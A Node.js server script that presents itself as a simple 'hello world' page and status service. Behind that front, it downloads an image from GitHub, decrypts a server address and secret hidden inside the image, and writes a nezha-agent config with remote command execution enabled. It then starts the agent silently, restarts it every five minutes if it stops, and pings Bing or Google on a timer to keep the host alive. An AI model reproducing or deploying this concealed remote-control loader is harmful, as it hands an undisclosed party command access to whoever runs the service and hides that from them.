const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { readdirSync, readFileSync } = require('fs');
const { spawn } = require('child_process');
const path = require('path');

// 容器统一临时目录
const BASEDIR = '/tmp/logs';
const PORT = process.env.SERVER_PORT || process.env.PORT || 8080;

ensureDir(BASEDIR);

const processList = ["nezha-agent"];
const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";

// 抓取网页文本（支持302重定向）
function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data));
                } else {
                    reject(new Error(`Fetch failed`));
                }
            }).on('error', () => reject(new Error(`Network error`)));
        };
        request(url);
    });
}

// 下载文件到本地
function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    res.pipe(file);
                    file.on('finish', () => {
                        file.close(() => resolve(true));
                    });
                } else {
                    fs.unlink(destPath, () => {});
                    reject(new Error(`Download failed`));
                }
            }).on('error', () => {
                fs.unlink(destPath, () => {});
                reject(new Error(`Download error`));
            });
        };
        request(url);
    });
}

// 获取服务器公网IP，失败读取内网IPv4
async function getServerIP() {
    try {
        return await fetchText('https://api.ipify.org');
    } catch (e) {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

// 通过IP生成标准UUID
function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0, 8)}-${hash.substring(8, 12)}-${hash.substring(12, 16)}-${hash.substring(16, 20)}-${hash.substring(20, 32)}`;
}

// 解析图片内加密配置
function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');

        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;

        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;

        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf-8').trim();

        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

// 解析配置文本中的环境变量
function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

// 拉取图片配置并启动哪吒agent
async function startNezhaAgent() {
    try {
        console.log("Loading nezha agent config from image...");
        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
        const localImagePath = '/tmp/dknz.png';

        await fetchFile(imageUrl, localImagePath);
        const decryptedText = parseImageMetadata(localImagePath);
        if (!decryptedText) return;

        const nezhaConfig = parseEnv(decryptedText);
        const ip = await getServerIP();
        const uuid = generateUUID(ip);

        const agentDir = '/tmp/agent_dir';
        const agentBin = '/usr/local/bin/nezha-agent';
        const configPath = path.join(agentDir, 'config.yml');

        if (!fs.existsSync(agentDir)) {
            fs.mkdirSync(agentDir, { recursive: true });
        }

        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        fs.writeFileSync(configPath, configContent);

        const child = spawn(agentBin, ['-c', configPath], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore"
        });

        child.on('spawn', () => {
            console.log("Nezha-agent started successfully");
        });
    } catch (err) {
        // 静默失败不抛错
    }
}

// 读取/proc 获取运行进程
function listRunningCommands() {
    try {
        return readdirSync('/proc')
            .filter(name => /^\d+$/.test(name))
            .map(pid => {
                try {
                    return { pid, cmdline: readFileSync(`/proc/${pid}/cmdline`, 'utf-8') };
                } catch {
                    return null;
                }
            })
            .filter(Boolean);
    } catch {
        return [];
    }
}

// 检测哪吒进程是否存活，不存在则启动
async function monitorProcesses() {
    const running = listRunningCommands();
    const missing = processList.every(keyword =>
        !running.some(proc => proc.cmdline.includes(keyword))
    );
    if (missing) await startNezhaAgent();
}

// ========== 新增：定时访问外网网站 ==========
async function visitExternalSite() {
    // 优先访问必应，失败自动尝试谷歌
    const targetUrls = [
        'https://www.bing.com',
        'https://www.google.com'
    ];

    for (const url of targetUrls) {
        try {
            await fetchText(url);
            console.log(`[定时访问] 成功访问 ${url}`);
            return; // 成功一个就停止
        } catch (e) {
            console.log(`[定时访问] 访问失败 ${url}`);
        }
    }
}

// 每4分钟执行一次
const VISIT_INTERVAL = 4 * 60 * 1000;
setInterval(visitExternalSite, VISIT_INTERVAL);
// ============================================

// 定时任务：每5分钟巡检进程
const Scheduler = {
    intervalMinutes: 5,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// HTTP服务
http.createServer(async (req, res) => {
    // 访问 /hello 显示哈喽世界页面，并自动启动哪吒
    if (req.url === '/hello') {
        res.writeHead(200, { 'Content-Type': 'text/html;charset=utf-8' });
        const html = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>哈喽世界</title>
<style>
body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#1890ff;color:#fff;font-size:48px;font-weight:bold}
</style>
</head>
<body>哈喽世界</body>
</html>
`;
        res.end(html);
        await startNezhaAgent();
        return;
    }

    // 首页JSON状态接口
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
        status: "online",
        service: "Agent Helper Service",
        version: "2.4.1",
        port: PORT,
        routes: ["/", "/hello"]
    }));
}).listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    // 服务启动后延迟2秒，同时启动进程巡检 + 第一次外网访问
    setTimeout(() => {
        Scheduler.loop();
        visitExternalSite();
    }, 2000);
});

// 递归创建目录工具函数
function ensureDir(p) {
    if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
}
